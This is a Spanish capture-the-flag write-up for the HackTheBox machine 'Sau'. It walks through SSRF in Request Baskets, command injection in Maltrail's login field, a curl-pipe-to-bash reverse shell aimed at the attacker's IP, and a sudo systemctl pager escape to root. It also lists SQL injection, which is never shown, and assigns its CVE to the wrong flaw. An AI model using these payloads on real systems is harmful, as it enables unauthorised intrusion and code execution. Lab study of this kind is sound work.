---
title: HackTheBox - Sau
author: cotes
date: 2023-09-07 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, SSRF, 'Command Injection']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Sau/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Sau Machine Logo
---

M치quina Linux de nivel **Easy** de HackThBox.

T칠cnicas usadas: **SQL Injection, SSRF, Command Injection**

### Fase de Reconocimiento 游빆

a. Enumeramos los puertos que est치n abiertos en la **`M치quina Sau`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Sau/01-ports.png)

b. Vemos las versiones de los servicios que se est치n ejecutando en los puertos.

* **`nmap -p<Ports> -sC  <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Sau/02-versions.png)

    > Tenemos 2 puertos filtrados **`80,8338`**

c. Visitamos la p치gina web

![](/assets/images/HTB/Easy/Sau/03-web.png)

* Al buscar algo relacionado con **`Request Baskets`** veremos que existe un **`SSRF`**, esto nos servir치 para ver los servicios de los **puertos filtrados** 

### **Configurando SSRF** 游붇

1. Creamos un nuevo **`basket`** y lo abrimos

    ![](/assets/images/HTB/Easy/Sau/04-step.png)

2. Lo configuramos para que todo el tr치fico que enviemos a este **`basket`** sea redirigido al puerto **`80`** interno de la m치quina

    ![](/assets/images/HTB/Easy/Sau/04-step2.png)

3. Si ahora visitamos el **basket** veremos la p치gina web del puerto **80** (Puerto Filtrado)

    ![](/assets/images/HTB/Easy/Sau/05-ssrf.png)

d. El servicio es **`Maltrail (v0.53)`**, y al buscar por vulnerabilidades encontramos [CVE:2023-27163](https://www.exploit-db.com/exploits/51676), es una inyecci칩n de comando

```bash
> curl 'http://<IP Sau>:55555/[basket]/login' --data 'username=;`curl http://<tun0 IP>:8081`'
--------------------------------------------------------------------------------------------------------------
> nc -lvnp 8081
listening on [any] 8081 ...
connect to [10.10.14.174] from (UNKNOWN) [10.10.11.224] 39976
```

c. Nos enviamos una reverse shell

```bash
> curl 'http://<IP Sau>:55555/08cexes/login' --data 'username=;`curl http://<tun0 IP>:4444|bash`'
```

![](/assets/images/HTB/Easy/Sau/06-shell.png)


### Escalada de Privilegios 游눷

a. Listamos privilegios a nivel de sudoers

```bash
puma@sau:/opt/maltrail$ sudo -l

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

b. Ejecutamos el script como root y una vez que el servicio se despliege teclearemos **`!/bin/bash`**

```bash
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
```

![](/assets/images/HTB/Easy/Sau/07-bash.png)